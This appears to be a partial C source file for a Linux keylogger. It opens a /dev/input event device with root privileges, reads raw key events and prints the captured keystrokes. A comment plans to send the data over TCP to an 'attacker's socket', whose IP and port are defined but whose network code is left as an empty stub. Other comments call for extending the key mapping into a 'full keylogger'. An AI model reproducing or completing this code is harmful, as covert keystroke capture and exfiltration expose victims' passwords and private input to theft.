/*

use the keyboard event file in /dev/
take argument

we cannot use fopen or fread to read events because of blocking behavior
use sys functions provided by kernel to read keyboard events (documentation for system functions are found in man 2), check man syscalls

Buffer to allocate is the input_event struct in header linux/input.h https://stackoverflow.com/questions/21204798/read-in-linux-for-event-file

open() returns int file descriptor

https://www.kernel.org/doc/html/v5.4/input/event-codes.html

must flush stream to avoid buffering, use fflush()

(TCP)

*/

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>

// attacker's socket
#define IP "127.0.0.0"
#define PORT 8080


void print(int fd);

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Eventfile argument required\n");
        return 1;
    }

    int fd = open(argv[1], O_RDONLY, 0);

    if (fd < 0) {
        fprintf(stderr, "Must run with root privileges\n");
        return 1;
    }

    // open socket

    // batch and print
    print(fd);

}

void print(int fd) {
    struct input_event ie;
    for (;;) {
        read(fd, &ie, sizeof(ie));
        if (ie.type != EV_KEY)
            continue;
        if (ie.value != 1)
            continue;

        if (ie.code >= 2 && ie.code <= 10) {
            printf("%d", ie.code - 1);
        } else if (ie.code == 11) {
            printf("0");
        } else {
            switch (ie.code) {
                case KEY_Q:
                    printf("q"); break;
                case KEY_W:
                    printf("w"); break;
                case KEY_E:
                    printf("e"); break;
                case KEY_R:
                    printf("r"); break;
                case KEY_T:
                    printf("t"); break;
                case KEY_Y:
                    printf("y"); break;
                case KEY_SPACE:
                    printf(" "); break;
                case KEY_BACKSPACE:
                    printf("(backspace)"); break;
                case KEY_CAPSLOCK:
                    printf("(capslock)"); break;
                // add more case statements for full keylogger
                default:
                    printf("Unknown key: %d\n", ie.code);
            }
        }
        fflush(stdout);
    }
}
